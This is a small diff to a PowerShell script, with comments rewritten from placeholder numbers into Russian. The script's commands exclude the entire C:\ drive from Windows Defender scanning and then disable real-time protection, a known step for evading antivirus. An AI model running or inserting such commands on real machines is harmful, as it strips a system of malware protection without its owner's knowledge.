@@ -1,9 +1,9 @@
-# 123
-# 1234
+# Убедитесь, что ваш скрипт выполняется с правами администратора
+# Включаем защиту в реальном времени
 Set-MpPreference -DisableRealtimeMonitoring $false
 
-# 12345
+# Добавляем путь в исключения
 Add-MpPreference -ExclusionPath "C:\"
 
-# 123456
+# Отключаем защиту в реальном времени (по желанию)
 Set-MpPreference -DisableRealtimeMonitoring $true
